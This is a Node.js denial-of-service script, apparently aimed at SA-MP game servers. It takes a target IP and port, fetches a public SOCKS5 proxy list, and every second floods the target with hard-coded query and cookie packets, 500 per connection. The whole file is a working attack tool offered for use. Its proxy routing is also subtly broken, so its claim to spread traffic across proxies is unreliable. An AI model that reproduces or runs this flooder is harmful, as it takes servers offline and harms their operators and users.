const axios = require('axios');
const HttpsProxyAgent = require('https-proxy-agent');
const fs = require('fs');

// ตั้งค่า IP และพอร์ตจากอาร์กิวเมนต์
const args = process.argv.slice(2);
if (args.length < 2) {
    console.log("Usage: node ta.js <IP> <PORT>");
    process.exit(1);
}

const ip = args[0];
const port = args[1];
const orgip = ip;

// ข้อมูลแพ็กเก็ตในรูปแบบ Hexadecimal
const packets = [
    Buffer.from('53414d5090d91d4d611e700a465b00', 'hex'), // p
    Buffer.from('53414d509538e1a9611e63', 'hex'), // c
    Buffer.from('53414d509538e1a9611e69', 'hex'), // i
    Buffer.from('53414d509538e1a9611e72', 'hex'), // r
    Buffer.from('081e62da', 'hex'), // cookie port 7796
    Buffer.from('081e77da', 'hex'), // cookie port 7777
    Buffer.from('081e4dda', 'hex'), // cookie port 7771
    Buffer.from('021efd40', 'hex'), // cookie port 7784
    Buffer.from('021efd40', 'hex'), // cookie port 1111 
    Buffer.from('081e7eda', 'hex')  // cookie port 1111 tambem
];

console.log(`Ataque iniciado no ip: ${orgip} e Porta: ${port}`);

// ดาวน์โหลด proxy list
async function getProxies() {
    const response = await axios.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt');
    return response.data.split('\n').filter(Boolean);
}

// ฟังก์ชันสำหรับส่งแพ็กเก็ตผ่าน proxy
async function sendPackets(proxy) {
    const agent = new HttpsProxyAgent(`socks5://${proxy}`);
    const socket = require('net').createConnection({ host: ip, port: port, agent: agent });

    socket.on('connect', () => {
        for (let i = 0; i < 500; i++) { // ส่ง 500 แพ็กเก็ต
            const msg = packets[Math.floor(Math.random() * packets.length)];
            socket.write(msg);

            if (port == 7777) {
                socket.write(packets[5]);
            } else if (port == 7796) {
                socket.write(packets[4]);
            } else if (port == 7771) {
                socket.write(packets[6]);
            } else if (port == 7784) {
                socket.write(packets[7]);
            } else if (port == 1111) {
                socket.write(packets[9]);
            }
        }
        socket.end(); // ปิดการเชื่อมต่อ
    });

    socket.on('error', (err) => {
        console.error(`Error with proxy ${proxy}: ${err.message}`);
    });
}

// ฟังก์ชันหลัก
async function startAttack() {
    const proxies = await getProxies();
    setInterval(() => {
        proxies.forEach(proxy => {
            sendPackets(proxy);
        });
    }, 1000); // ส่ง request ทุก 1 วินาที
}

// เริ่มการทำงาน
startAttack();